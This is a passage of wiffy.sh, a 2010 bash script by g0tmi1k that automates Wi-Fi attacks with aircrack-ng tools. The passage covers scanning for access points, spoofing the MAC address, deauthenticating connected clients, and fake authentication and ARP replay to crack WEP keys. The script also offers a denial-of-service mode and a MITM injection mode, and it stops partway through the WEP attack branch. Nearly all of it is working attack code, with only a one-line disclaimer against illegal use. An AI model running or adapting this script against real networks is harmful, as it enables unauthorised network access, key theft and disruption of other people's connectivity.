#!/bin/bash
#----------------------------------------------------------------------------------------------#
#wiffy.sh v0.1 (#19 2010-09-25)                                                                #
# (C)opyright 2010 - g0tmi1k                                                                   #
#---License------------------------------------------------------------------------------------#
#  This program is free software: you can redistribute it and/or modify it under the terms     #
#  of the GNU General Public License as published by the Free Software Foundation, either      #
#  version 3 of the License, or (at your option) any later version.                            #
#                                                                                              #
#  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
#  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
#  See the GNU General Public License for more details.                                        #
#                                                                                              #
#  You should have received a copy of the GNU General Public License along with this program.  #
#  If not, see <http://www.gnu.org/licenses/>.                                                 #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces you use
interface="wlan0"

# [crack/dos/inject] Crack - cracks WiFi Keys, dos - blocks access to ap, inject - MITM attack
mode="crack"

# [random/set/false] Change the MAC address
macMode="random"
fakeMac="00:05:7c:9a:58:3f"

# [/path/to/file] The wordlist used to brute force WPA keys
wordlist="/pentest/passwords/wordlists/wpa.txt"

# [true/false] Connect to network afterwords
extras="false"

# [true/false] Keep captured cap's. [/path/to/folder/] Where to store the CAP
keepCAP="false"
outputCAP="$(pwd)/"

# [true/false] Test system performance at cracking WPA, attempts to generate ETA.
benchmark="true"

# [true/false] diagnostics = Creates a output file displays exactly whats going on. [0/1/2] verbose = Shows more info. 0=normal, 1=more , 2=more+commands
diagnostics="false"
verbose="0"

#---Variables----------------------------------------------------------------------------------#
monitorInterface="mon0"           # Default
       outputCAP="${outputCAP%/}" # Remove trailing slash
           bssid=""               # null the value
           essid=""               # null the value
         channel=""               # null the value
          client=""               # null the value
           debug="false"          # Windows don't close, shows extra stuff
         logFile="wiffy.log"      # Filename of output
             svn="19"             # SVN Number
         version="0.1 (#19)"      # Program version
trap 'cleanup interrupt' 2        # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function action() { #action title command #screen&file #x|y|lines #hold
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ ! -z "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ] ; then error="3" ; fi # Coding error
   if [ ! -z "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ] ; then error="5" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$5" == "true" ] ; then xterm="$xterm -hold" ; fi
      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi
      if [ "$diagnostics" == "true" ] ; then echo "$1~$command" >> $logFile ; fi
      if [ "$diagnostics" == "true" ] && [ "$3" == "true" ] ; then command="$command | tee -a $logFile" ; fi
      if [ ! -z "$4" ] ; then
         x=$(echo $4 | cut -d '|' -f1)
         y=$(echo $4 | cut -d '|' -f2)
         lines=$(echo $4 | cut -d '|' -f3)
      fi
      $xterm -geometry 100x$lines+$x+$y -T "wiffy v$version - $1" -e "$command"
      return 0
   else
      display error "action. Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: action (Error code: $error): $1, $2, $3, $4, $5" >> $logFile ;
      return 1
   fi
}
function cleanup() { #cleanup #mode
   if [ "$1" == "nonuser" ] ; then exit 3 ;
   elif [ "$1" != "clean" ] && [ "$1" != "remove" ]; then
      echo # Blank line
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "*** BREAK ***" ; fi # User quit
      action "Killing xterm" "killall xterm"
   fi

   if [ "$1" != "remove" ]; then
      display action "Restoring: Environment"
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Restoring: Programs" ; fi
      command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
      if [ "$command" == "$monitorInterface" ] ; then
         sleep 3 # Sometimes it needs to catch up/wait
         action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
      fi
      action "Starting services" "/etc/init.d/wicd start ; service network-manager start" # Backtrack & Ubuntu
   fi

   if [ "$debug" != "true" ] || [ "$1" == "remove" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Removing: Temp files" ; fi
      command=""
      tmp=$(ls /tmp/wiffy-01* 2> /dev/null)
      if [ "$tmp" ] ; then command="$command /tmp/wiffy-01*" ; fi
      tmp=$(ls replay_*.cap 2> /dev/null)
      if [ "$tmp" ] ; then command="$command replay_*.cap" ; fi
      tmp=$(ls fragment*.xor 2> /dev/null)
      if [ "$tmp" ] ; then command="$command fragment*.xor" ; fi
      tmp=$(ls /tmp/wiffy-*.cap 2> /dev/null)
      if [ "$tmp" ] ; then command="$command /tmp/wiffy-*.cap" ; fi
      if [ -e "/tmp/wiffy.keys" ] ; then command="$command /tmp/wiffy.keys" ; fi
      if [ -e "/tmp/wiffy.tmp" ] ; then command="$command /tmp/wiffy.tmp" ; fi
      if [ -e "/tmp/wiffy.handshake" ] ; then command="$command /tmp/wiffy.handshake" ; fi
      if [ -e "/tmp/wiffy.arp" ] ; then command="$command /tmp/wiffy.arp" ; fi
      if [ ! -z "$command" ] ; then action "Removing temp files" "rm -rfv $command" ; fi
   fi

   if [ "$1" != "remove" ] ; then
      if [ "$diagnostics" == "true" ] ; then echo -e "End @ $(date)" >> $logFile ; fi
      echo -e "\e[01;36m[*]\e[00m Done! (= Have you... g0tmi1k?"
      exit 0
   fi
}
function display() { #display type message
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="5" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      output=""
      if [ "$1" == "action" ] ; then output="\e[01;32m[>]\e[00m" ; fi
      if [ "$1" == "info" ] ; then output="\e[01;33m[i]\e[00m" ; fi
      if [ "$1" == "diag" ] ; then output="\e[01;34m[+]\e[00m" ; fi
      if [ "$1" == "error" ] ; then output="\e[01;31m[!]\e[00m" ; fi
      output="$output $2"
      echo -e "$output"

      if [ "$diagnostics" == "true" ] ; then
         if [ "$1" == "action" ] ; then output="[>]" ; fi
         if [ "$1" == "info" ] ; then output="[i]" ; fi
         if [ "$1" == "diag" ] ; then output="[+]" ; fi
         if [ "$1" == "error" ] ; then output="[!]" ; fi
         echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
      fi
      return 0
   else
      display error "display. Error code: $error" $logFile 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: display (Error code: $error): $1, $2" >> $logFile ;
      return 1
   fi
}
function findAP () { #findAP
   loopMain="false"
   if [ "$mode" == "inject" ] ; then loopMain="true" ; fi
   while [ "$loopMain" != "true" ] ; do
      for (( i=1; i<=3; i++ )) ; do
      if [ -e "/tmp/wiffy.tmp" ] && grep -q "No scan results" "/tmp/wiffy.tmp" ; then action "Refreshing interface" "ifconfig $interface down && ifconfig $interface up && sleep 1" ; fi
         action "Scanning network (#$i)" "rm -vf /tmp/wiffy.tmp && iwlist $interface scan | tee /tmp/wiffy.tmp"
         if [ -e "/tmp/wiffy.tmp" ] && ! grep -q "No scan results" "/tmp/wiffy.tmp" ; then break ; fi
      done

      IFS=$'\n' # Internal Field Separator. Only separate on each new line.
      index="-1" # so its starts at 0
      id="" # For -e or -b
      for line in $(cat "/tmp/wiffy.tmp"); do
         if [[ $line == *Address:* ]] ; then command=$(echo "$line" | awk '{print $5}\') ; index=$(($index+1)) ; arrayBSSID[$index]="$command" ; arrayEncryption[$index]="WEP" ; if [ "$bssid" ] && [ "$bssid" == "$command" ] ; then id="$index" ; fi # WEP = DEFAULT
         elif [[ $line == *ESSID* ]] ; then command=$(echo "$line" | awk -F ':' '/ESSID/{print $2}' | sed 's/\"//' | sed 's/\(.*\)\"/\1/') ; arrayESSID[$index]="$command" ; if [ "$essid" ] && [ "$essid" == "$command" ] ; then id="$index" ; fi
         elif [[ $line == *Channel:* ]] ; then arrayChannel[$index]=$(echo $line | tr ':' ' ' | awk '{print $2}\')
         elif [[ $line == *Quality* ]] ; then arrayQuality[$index]=$(echo $line |  grep "Quality" | sed 's/.*Quality=//g' | awk -F " " '{print $1}')
         elif [[ $line == *key:* ]] ; then command=$(echo "$line" |  grep "key:" | sed 's/.*key://g') ; arrayProtected[$index]="$command" ; if [ $command == "off" ] ; then arrayEncryption[$index]="N/A" ; fi
         elif [[ $line == *WPA* ]] ; then arrayEncryption[$index]="WPA"
         fi
      done
      if [ "$id" ] ; then
         loopMain="true"
      else
         if [ "$essid" ] ; then display error "Couldn't detect ESSID ($essid)" 1>&2 ; fi
         if [ "$bssid" ] ; then display error "Couldn't detect BSSID ($bssid)" 1>&2 ; fi
         loop=${#arrayBSSID[@]}
         echo -e " Num |              ESSID               |       BSSID       | Protected | Cha | Quality\n-----|----------------------------------|-------------------|-----------|-----|---------"
         for (( i=0;i<$loop;i++)); do
            printf '  %-2s | %-32s | %-16s | %3s (%-3s) |  %-3s|  %-6s\n' "$(($i+1))" "${arrayESSID[${i}]}" "${arrayBSSID[${i}]}" "${arrayProtected[${i}]}" "${arrayEncryption[${i}]}" "${arrayChannel[${i}]}" "${arrayQuality[${i}]}"
         done
         loopSub="false"
         while [ "$loopSub" != "true" ] ; do
            read -p "[~] re[s]can, e[x]it or select num: "
            if [ "$REPLY" == "x" ] ; then cleanup clean
            elif [ "$REPLY" == "s" ] ; then loopSub="true"
            elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input" 1>&2
            elif [ "$REPLY" -lt 1 ] || [ "$REPLY" -gt $loop ] ; then display error "Incorrect number" 1>&2
            else id="$(($REPLY-1))" ; loopSub="true" ; loopMain="true"
            fi
         done
      fi
   done
   essid="${arrayESSID[$id]}"
   bssid="${arrayBSSID[$id]}"
   channel="${arrayChannel[$id]}"
   encryption="${arrayEncryption[$id]}"
}
function findClient () { #findClient $encryption
   if [ -z "$1" ] && [ -z "$2" ] ; then error="1" ; fi # Coding error

   if [ "$error" == "free" ] ; then
      clientOLD=" "
      if [ "$client" != "" ] ; then clientOLD=$client ; fi
      client=""
      while [ ! -e "/tmp/wiffy-01.kismet.netxml" ] ; do sleep 1 ; done

      if [ "$1" == "WEP" ] || [ "$1" == "N/A" ] ; then # N/A = For MAC filtering
         sleep 5
         client=$(cat "/tmp/wiffy-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
         if [ -z "$client" ] ; then
            action "DeAuth" "aireplay-ng --deauth 5 -a $bssid $monitorInterface" "true" "0|195|5" # Helping "kick", for idle client(s)
            sleep 5
            client=$(cat "/tmp/wiffy-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
         fi
      elif [ "$1" == "WPA" ] ; then
         i=1
         while [ -z "$client" ] ; do
            sleep 2
            client=$(cat "/tmp/wiffy-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | sed "/$clientOLD/d" | head -1)
            if [ -z "$client" ] ; then
               if [ "$i" -lt "4" ] ; then action "DeAuth (#$i)" "aireplay-ng --deauth 5 -a $bssid $monitorInterface" "true" "0|195|5" ; i=$(($i+1)) ; fi # Helping "kick", for idle client(s)
               sleep 5
               client=$(cat "/tmp/wiffy-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
               if [ -z "$client" ] ; then cilent=$clientOLD ; fi # If there is only one client, we have to use it again!
            fi
         done
      fi

      if [ -z "$essid" ] ; then
         essid=$(cat "/tmp/wiffy-01.kismet.netxml" | grep "<essid cloaked=\"false\">" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/')
         if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "*hidden* essid=$essid" ; fi
      fi

      if [ "$client" == "" ] ; then client="clientless" ; fi
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "client=$client" ; fi
      return 0
   else
      display error "findClient. Error code: $error" 1>&2
      return 1
   fi
}
function help() { #help
   echo "(C)opyright 2010 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash wiffy.sh -i [interface] -t [interface] -m [crack/dos/inject] -e [essid] -b [mac] -c [mac]
		-w [/path/to/file] (-z [random/set/false] / -s [mac]) -x -k -o [/path/to/folder/] -d (-v / -V) ([-u] [-?])


 Options:
   -i [interface]         ---  Internet Interface e.g. $interface
   -t [interface]         ---  Monitor Interface  e.g. $monitorInterface

   -m [crack/dos/inject]  ---  Mode. e.g. $mode

   -e [ESSID]             ---  ESSID (WiFi Name) e.g. Linksys
   -b [MAC]               ---  BSSID (AP MAC Address) e.g. 01:23:45:67:89:AB
   -c [MAC]               ---  Client's Mac Address e.g. FE:DC:BA:98:76:54

   -w [/path/to/file]     ---  Path to Wordlist e.g. $wordlist

   -z [random/set/false]  ---  Change interface's MAC Address e.g. $macMode
   -s [MAC]               ---  Use this MAC Address e.g. $fakeMac

   -x                     ---  Connect to network afterwords

   -k                     ---  Keep capture cap files
   -o [/path/to/folder/]   ---  Output folder for the cap files

   -d                     ---  Diagnostics      (Creates output file, $logFile)
   -v                     ---  Verbose          (Displays more)
   -V                     ---  (Higher) Verbose (Displays more + shows commands)

   -u                     ---  Checks for an update
   -?                     ---  This screen


 Example:
   bash wiffy.sh
   bash wiffy.sh -i wlan1 -e Linksys -w /pentest/passwords/wordlists/wpa.lst -x -v
   bash wiffy.sh -m dos -V


 Known issues:
    -WEP
       > Didn't detect my client
          + Add it in manually
          + Re-run the script
       > IV's doesn't increae
          + DeAuth didn't work --- Client using Windows 7?
          + Use a different router/client

    -WPA
       > You can ONLY crack WPA when:
          + The ESSID is known
          + The WiFi key is in the word-list
          + There is a connected client

    -Doesn't detect any/my wireless network
       > Don't run from a virtual machine
       > Driver issue - Use a different WiFi device
       > Re-run the script
       > Unplug WiFi device, wait, replug
       > You're too close/far away

    -\"Extras\" doesn't work
       > Network doesn't have a DHCP server

    -Slow
       > Try a different attack... manually!
"
   exit 1
}
function update() { #update
   display action "Checking for an update"
   if [ -e "/usr/bin/svn" ] ; then
      command=$(svn info http://g0tmi1k.googlecode.com/svn/trunk/wiffy/ | grep "Last Changed Rev:" | cut -c19-)
      if [ "$command" != "$svn" ] ; then
         display info "Updating"
         svn export -q --force "http://g0tmi1k.googlecode.com/svn/trunk/wiffy" ./
         display info "Updated to $update (="
      else
         display info "You're using the latest version. (="
      fi
   else
      command=$(wget -qO- "http://g0tmi1k.googlecode.com/svn/trunk/" | grep "<title>g0tmi1k - Revision" |  awk -F " " '{split ($4,A,":"); print A[1]}')
      if [ "$command" != "$svn" ] ; then
         display info "Updating"
         wget -q -N "http://g0tmi1k.googlecode.com/svn/trunk/wiffy/wiffy.sh"
         display info "Updated! (="
      else
         display info "You're using the latest version. (="
      fi
   fi
   echo
   exit 2
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m wiffy v$version"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ] ; then display error "Run as root" 1>&2 ; cleanup nonuser; fi

#----------------------------------------------------------------------------------------------#
while getopts "i:t:m:e:b:c:w:z:s:xko:dvVu?" OPTIONS; do
   case ${OPTIONS} in
      i ) interface=$OPTARG;;
      t ) monitorInterface=$OPTARG;;
      m ) mode=$OPTARG;;
      e ) essid=$OPTARG;;
      b ) bssid=$OPTARG;;
      c ) client=$OPTARG;;
      w ) wordlist=$OPTARG;;
      z ) macMode=$OPTARG;;
      s ) fakeMac=$OPTARG;;
      x ) extras="true" ;;
      k ) keepCAP="true" ;;
      o ) outputCAP=$OPTARG;;
      d ) diagnostics="true" ;;
      v ) verbose="1" ;;
      V ) verbose="2" ;;
      u ) update;;
      ? ) help;;
      * ) display error "Unknown option" 1>&2 ;;   # Default
   esac
done

#----------------------------------------------------------------------------------------------#
if [ "$debug" == "true" ] ; then
   display info "Debug mode"
fi
if [ "$diagnostics" == "true" ] ; then
   display diag "Diagnostics mode"
   echo -e "wiffy v$version\nStart @ $(date)" > $logFile
   echo "wiffy.sh" $* >> $logFile
fi

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ -z "$interface" ] ; then display error "interface can't be blank" 1>&2 ; cleanup ; fi
if [ "$mode" != "crack" ] && [ "$mode" != "dos" ] && [ "$mode" != "inject" ] ; then display error "mode ($mode) isn't correct" 1>&2 ; cleanup ; fi

if [ -z "$monitorInterface" ] ; then display error "monitorInterface is blank" 1>&2 ; fi # Trys to detect it later
if [ "$macMode" != "random" ] && [ "$macMode" != "set" ] && [ "$macMode" != "false" ] ; then display error "macMode ($macMode) isn't correct" 1>&2 ; macMode="false" ; fi
if [ "$macMode" == "set" ] && ([ -z "$fakeMac" ] || [ ! $(echo $fakeMac | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ]) ; then display error "fakeMac ($fakeMac) isn't correct" 1>&2 ; macMode="false" ; fi
if [ "$mode" == "crack" ] ; then
   if [ ! -e "$wordlist" ] ; then display error "Unable to crack WPA. There isn't a wordlist at: $wordlist" 1>&2 ; fi # Can't do WPA...
   if [ "$extras" != "true" ] && [ "$extras" != "false" ] ; then display error "extras ($extras) isn't correct" 1>&2 ; extras="false" ; fi
   if [ "$keepCAP" != "true" ] && [ "$keepCAP" != "false" ] ; then display error "keepCAP ($keepCAP) isn't correct" 1>&2 ; keepCAP="false" ; fi
   if [ -z "$outputCAP" ] ; then display error "outputCAP ($outputCAP) isn't correct" 1>&2 ; outputCAP="$(pwd)" ; fi
   if [ "$benchmark" != "true" ] && [ "$benchmark" != "false" ] ; then display error "benchmark ($benchmark) isn't correct" 1>&2 ; benchmark="false" ; fi
fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then display error "verbose ($verbose) isn't correct" 1>&2 ; verbose="0"; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then display error "debug ($debug) isn't correct" 1>&2 ; debug="true" ; fi # Something up... Find out what!
if [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then display error "diagnostics ($diagnostics) isn't correct" 1>&2 ; diagnostics="false" ; fi
if [ "$diagnostics" == "true" ] && [ -z "$logFile" ] ; then display error "logFile ($logFile) isn't correct" 1>&2 ; logFile="wiffy.log" ; fi

#for item in "foo" "bar" ; do
#   if [ -z "$item" ] ; then display error "$item can't be blank" 1>&2 ; cleanup ; fi
#done

#----------------------------------------------------------------------------------------------#
command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d " " -f1)
if [ ! "$command" ] ; then
   display error "$interface isn't a wireless interface"
   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d " " -f1)
   if [ "$command" ] ; then
      interface="$command"
      display info "Found: $interface"
   else
      display error "Couldn't detect a wireless interface" 1>&2
      cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Stopping: Programs" ; fi
command=$(ps aux | grep "$interface" | awk '!/grep/ && !/awk/ && !/wiffy/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # to prevent interference
action "Killing programs" "killall wicd-client airodump-ng xterm wpa_action wpa_supplicant wpa_cli dhclient ifplugd dhcdbd dhcpcd NetworkManager knetworkmanager avahi-autoipd avahi-daemon wlassistant wifibox" # Killing "wicd-client" to prevent channel hopping
action "Killing services" "/etc/init.d/wicd stop ; service network-manager stop" # Backtrack & Ubuntu

#----------------------------------------------------------------------------------------------#
action "Refreshing interface" "ifconfig $interface down && ifconfig $interface up && sleep 1"

#----------------------------------------------------------------------------------------------#
findAP

#----------------------------------------------------------------------------------------------#
mac=$(macchanger --show "$interface" | awk -F " " '{print $3}')
if [ -e "/sys/class/net/$interface/device/driver" ] ; then wifiDriver=$(ls -l "/sys/class/net/$interface/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/') ; fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then
   echo "-Settings------------------------------------------------------------------------------------
        interface=$interface
 monitorInterface=$monitorInterface
             mode=$mode
            essid=$essid
            bssid=$bssid
       encryption=$encryption
          channel=$channel
           client=$client
         wordlist=$wordlist
              mac=$mac
          macMode=$macMode
          fakeMac=$fakeMac
          keepCAP=$keepCAP
        outputCAP=$outputCAP
        benchmark=$benchmark
      diagnostics=$diagnostics
          verbose=$verbose
            debug=$debug
       wifiDriver=$wifiDriver
-Environment---------------------------------------------------------------------------------" >> $logFile
   display diag "Detecting: Kernel"
   uname -a >> $logFile
   display diag "Detecting: Hardware"
   echo "-lspci-----------------------------------" >> $logFile
   lspci -knn >> $logFile
   echo "-lsmod-----------------------------------" >> $logFile
   lsmod >> $logFile
fi
if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    display info "       interface=$interface
\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
\e[01;33m[i]\e[00m             mode=$mode
\e[01;33m[i]\e[00m            essid=$essid
\e[01;33m[i]\e[00m            bssid=$bssid
\e[01;33m[i]\e[00m       encryption=$encryption
\e[01;33m[i]\e[00m          channel=$channel
\e[01;33m[i]\e[00m           client=$client
\e[01;33m[i]\e[00m         wordlist=$wordlist
\e[01;33m[i]\e[00m              mac=$mac
\e[01;33m[i]\e[00m          macMode=$macMode
\e[01;33m[i]\e[00m          fakeMac=$fakeMac
\e[01;33m[i]\e[00m          keepCAP=$keepCAP
\e[01;33m[i]\e[00m        outputCAP=$outputCAP
\e[01;33m[i]\e[00m        benchmark=$benchmark
\e[01;33m[i]\e[00m      diagnostics=$diagnostics
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m       wifiDriver=$wifiDriver"
fi

#----------------------------------------------------------------------------------------------#
if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
   display error "aircrack-ng isn't installed" 1>&2
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install aircrack-ng" "apt-get -y install aircrack-ng" ; fi
   if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
      display error "Failed to install aircrack-ng" 1>&2 ; cleanup
   else
      display info "Installed: aircrack-ng"
   fi
fi
if [ ! -e "/usr/bin/macchanger" ] ; then
   display error "macchanger isn't installed"
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install macchanger" "apt-get -y install macchanger" ; fi
   if [ ! -e "/usr/bin/macchanger" ] ; then
      display error "Failed to install macchanger" 1>&2 ; cleanup
   else
      display info "Installed: macchanger"
   fi
fi
if [ "$mode" == "inject" ] ; then
   if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
      display error "airpwn isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install airpwn" "apt-get -y install libnet1-dev libpcap-dev python2.4-dev libpcre3-dev libssl-dev" ; fi
      action "Install airpwn" "wget -P /tmp http://downloads.sourceforge.net/project/airpwn/airpwn/1.4/airpwn-1.4.tgz && tar -C /pentest/wireless -xvf /tmp/airpwn-1.4.tgz && rm /tmp/airpwn-1.4.tgz"
      find="#ifndef _LINUX_WIRELESS_H"
      replace="#include <linux\/if.h>\n#ifndef _LINUX_WIRELESS_H"
      sed "s/$replace/$find/g" "/usr/include/linux/wireless.h" > "/usr/include/linux/wireless.h.new"
      sed "s/$find/$replace/g" "/usr/include/linux/wireless.h.new" > "/usr/include/linux/wireless.h"
      rm -f "/usr/include/linux/wireless.h.new"
      action "Install airpwn" "tmp=\$(pwd) && tar -C /pentest/wireless/airpwn-1.4 -xvf /pentest/wireless/airpwn-1.4/lorcon-current.tgz && cd /pentest/wireless/airpwn-1.4/lorcon && ./configure && make && make install && cd \$tmp"
      action "Install airpwn" "tmp=\$(pwd) && cd /pentest/wireless/airpwn-1.4 && ./configure && make && cd \$tmp"
      if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
         display error "Failed to install airpwn" 1>&2 ; cleanup
      else
         display info "Installed: airpwn"
      fi
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"

#----------------------------------------------------------------------------------------------#
cleanup remove

#----------------------------------------------------------------------------------------------#
#http://www.backtrack-linux.org/forums/backtrack-howtos/31403-howto-rtl8187-backtrack-r1-monitor-mode-unknown-error-132-a.html
if [ "$wifiDriver" == "rtl8187" ] ; then action "Changing drivers" "rmmod rtl8187 ; rmmod mac80211 ; modprobe r8187" ; fi

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: Wireless card" ; fi
command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" == "$monitorInterface" ] ; then
   action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface"
   sleep 1
fi

action "Monitor Mode (Starting)" "airmon-ng start $interface $channel | tee /tmp/wiffy.tmp"
command=$(cat "/tmp/wiffy.tmp" | awk '/monitor mode enabled on/ {print $5}' | tr -d '\011' | sed 's/\(.*\)./\1/')
if [ "$monitorInterface" != "$command" ] && [ "$command" ] ; then
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Configuring: Chaning monitorInterface to: $command" ; fi
   monitorInterface="$command"
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
   display diag "Testing: Wireless Injection"
   command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
   if [ "$diagnostics" == "true" ] ; then echo -e "$command" >> $logFile ; fi
   if [ -z "$(echo \"$command\" | grep 'Injection is working')" ] ; then display error "$monitorInterface doesn't support packet injecting" 1>&2
   elif [ -z "$(echo \"$command\" | grep 'Found 0 APs')" ] ; then display error "Couldn't test packet injection" 1>&2 ;
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$macMode" != "false" ] ; then
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: MAC address" ; fi
   command="ifconfig $monitorInterface down &&"
   if [ "$macMode" == "random" ] ; then command="$command macchanger -A $monitorInterface &&"
   elif [ "$macMode" == "set" ] ; then command="$command macchanger -m $fakeMac $monitorInterface &&" ; fi
   command="$command ifconfig $monitorInterface up"
   action "Configuring MAC" "$command"
   command=$(macchanger --show $monitorInterface)
   mac=$(echo $command | awk -F " " '{print $3}')
   macType=$(echo $command | awk -F "Current MAC: " '{print $2}')
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "mac=$macType" ; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "crack" ] ; then

   display action "Starting: airodump-ng"
   action "airodump-ng" "rm -vf /tmp/wiffy-01* && airodump-ng --bssid $bssid --channel $channel --write /tmp/wiffy $monitorInterface" "true" "0|0|13" & # Don't wait, do the next command
   sleep 1

   #----------------------------------------------------------------------------------------------#
   if [ -z "$client" ] ; then
      display action "Detecting: Client(s)"
      findClient $encryption
   fi

   #----------------------------------------------------------------------------------------------#
   if [ "$encryption" == "WEP" ] ; then
      if [ "$client" == "clientless" ] ; then
         display action "Attack (FakeAuth): $mac"
         action "FakeAuth" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $mac $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
         if grep -q "No such BSSID available" "/tmp/wiffy.tmp" ; then display error "Couldn't detect $essid" 1>&2 ;
         elif grep -q "Association successful" "/tmp/wiffy.tmp" ; then if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Attack (FakeAuth): Successfully association!" ; fi ; fi
         client="$mac"
         sleep 1
      fi
      display action "Attack (ARPReplay): $client"
      action "ARPReplay" "aireplay-ng --arpreplay -e \"$essid\" -b $bssid -h $client $monitorInterface" "true" "0|195|5" & # Don't wait, do the next command
      sleep 1
      action "DeAuth" "aireplay-ng --deauth 5 -e \"$essid\" -a $bssid -c $client $monitorInterface" "true" "0|285|5"
      sleep 1
      if [ "$client" == "$mac" ] ; then sleep 8 && display action "Attack (FakeAuth): $mac" && action "FakeAuth" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $client $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|285|5" ; fi
      if grep -q "No such BSSID available" "/tmp/wiffy.tmp" ; then display error "Couldn't detect $essid" 1>&2 ;
      elif grep -q "Association successful" "/tmp/wiffy.tmp" ; then if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Attack (FakeAuth): Successfully association!" ; fi ; fi
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Waiting for IV's increase" ; fi
      sleep 10

